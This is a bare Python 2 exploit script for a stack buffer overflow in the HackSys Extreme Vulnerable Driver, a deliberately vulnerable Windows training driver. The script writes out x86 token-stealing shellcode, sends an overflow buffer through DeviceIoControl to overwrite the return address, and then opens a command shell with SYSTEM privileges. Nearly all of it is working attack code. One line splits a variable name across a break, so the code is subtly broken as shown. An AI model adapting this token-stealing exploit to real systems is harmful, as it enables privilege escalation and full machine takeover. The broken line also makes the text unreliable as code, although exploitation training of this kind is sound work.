import ctypes, sys, struct
from ctypes import *
from subprocess import *

def main():
    kernel32 = windll.kernel32
    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    if not hevDevice:
        print "*** Error  Device Driver handle"
        exit(0)
 
    shellcode = "\x90" * 20 
    shellcode += bytearray(
        "\x60"                            
        "\x31\xc0"                       
        "\x64\x8b\x80\x24\x01\x00\x00"   
        "\x8b\x40\x50"                    
        "\x89\xc1"                        
        "\xba\x04\x00\x00\x00"            
        "\x8b\x80\xb8\x00\x00\x00"      
        "\x2d\xb8\x00\x00\x00"            
        "\x39\x90\xb4\x00\x00\x00"       
        "\x75\xed"                      
        "\x8b\x90\xf8\x00\x00\x00"       
        "\x89\x91\xf8\x00\x00\x00"       
        "\x61"                          
        "\x31\xc0"                       
        "\x5d"                            
        "\xc2\x08\x00"                   
    )
 
    ptr_address_shellcode = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr_
                                 address_shellcode),buff,c_int(len(shellcode)))
    shellcode_final = struct.pack("<L",ptr_address_shellcode) # Address Shellcode
 
    buf = "A"*0x820 + shellcode_final
    bufLength = len(buf) 
 
    kernel32.DeviceIoControl(hevDevice, 0x222003, buf, bufLength, None, 0, byref(c_ulong()), None)
    Popen("start cmd", shell=True)
 
if __name__ == "__main__":
    main()
